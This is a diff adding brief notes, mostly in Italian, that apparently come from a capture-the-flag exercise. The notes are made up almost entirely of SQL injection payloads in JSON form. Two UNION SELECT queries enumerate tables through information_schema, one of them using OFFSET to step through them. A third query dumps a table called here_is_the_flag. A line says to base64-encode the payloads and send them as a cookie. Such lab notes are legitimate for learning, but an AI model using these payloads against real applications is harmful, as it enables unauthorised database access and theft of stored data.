@@ -1,0 +1,7 @@
+{"ID":"'asdf' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -"} per sapere le tabelle
+
+
+{"ID":"'asdf' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -"} QUESTO SERVE PER VEDERE TUTTE LE TABELLE CON OFFSET
+
+mettere tutti questi come cookie to base64
+{"ID":"'asdf' UNION SELECT * from here_is_the_flag -- -"}
